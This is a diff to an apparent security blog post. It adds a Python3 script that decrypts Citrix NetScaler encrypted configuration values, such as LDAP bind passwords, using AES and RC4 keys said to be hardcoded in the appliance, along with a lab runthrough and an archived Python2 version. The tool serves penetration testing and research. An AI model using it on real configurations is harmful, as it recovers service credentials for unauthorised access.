@@ -42,8 +42,84 @@ Extract the ldapBindDnPassword and pass it to the script:
 test12345678secretldappassword
 ```
 
-## Decrypting script
+## Decrypting script (updated to Python3)
 The below python script will decrypt LDAP and likely similar encrypted values (haven't tested anything else) obtained from the config.
+
+{% highlight python %}
+#!/usr/bin/env python3
+
+import base64
+from Crypto.Cipher import AES,ARC4
+import binascii,sys
+
+
+BS = 16
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+#thanks  https://stackoverflow.com/a/12525165 for crypto snippet
+class AESCipher:
+    def __init__( self, key ):
+        self.key = key
+
+    def decrypt( self, enc, mode ):
+        if mode == "ENCMTHD_2":
+                cipher = AES.new(self.key, AES.MODE_ECB )
+        elif mode == "ENCMTHD_3":
+                iv = ("\x00" * 16).encode("UTF-8")
+                cipher = AES.new(self.key, AES.MODE_CBC, iv )
+
+        else:
+            print("Invalid mode")
+            return False
+
+        return unpad(cipher.decrypt( enc ))
+
+
+def main():
+        #Keys hardcoded into netscaler libnscli90.so
+        aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")
+        rc4key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")
+
+        if len(sys.argv) == 3:
+            ciphertext = sys.argv[1]
+            mode = sys.argv[2]
+
+            if mode == "ENCMTHD_3" or mode == "ENCMTHD_2":
+                c = AESCipher(aeskey)
+                decoded = c.decrypt(binascii.unhexlify(ciphertext),mode)
+                if mode == "ENCMTHD_3":
+                        print(decoded[16:].decode())
+                else:
+                        print(decoded.decode())
+
+            elif mode == "ENCMTHD_1": #old rc4 mode
+                out_cipher = ARC4.new(rc4key)
+                decoded = out_cipher.decrypt(binascii.unhexlify(ciphertext))
+                print(decoded.decode())
+
+
+if __name__ == "__main__":
+        main()
+{% endhighlight %}
+
+#### Runthrough
+
+```
+>add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword test12345678secretldappassword -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
+Done
+>show running
+..snip..
+add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
+..snip..
+
+# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
+test12345678secretldappassword
+```
+
+#### Archive
+
+This is the old Python2 script - use if the updated Python3 version above does not work.
+
 {% highlight python %}
 #!/usr/bin/python
 
@@ -100,20 +176,3 @@ def main():
 if __name__ == "__main__":
         main()
 {% endhighlight %}
-
-
-
-#### Runthrough
-
-```
->add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword test12345678secretldappassword -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
-Done
->show running
-..snip..
-add authentication ldapAction LDAP_mgmt -serverIP 192.168.200.130 -serverPort 636 -ldapBase "DC=citrix,DC=lab" -ldapBindDn readonly@citrix.lab -ldapBindDnPassword b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -searchFilter "&(memberof=CN=NSG_Admin,OU=AdminGroups,DC=citrix,DC=lab)" -groupAttrName memberOf
-..snip..
-
-# python decitrix.py b65f2142d01fe706083173b064c04cfc6b81ab2417d39d63d2b3216176d0e638b89cbca0f1c4294db56b66668f94ff0f ENCMTHD_3
-test12345678secretldappassword
-```
-
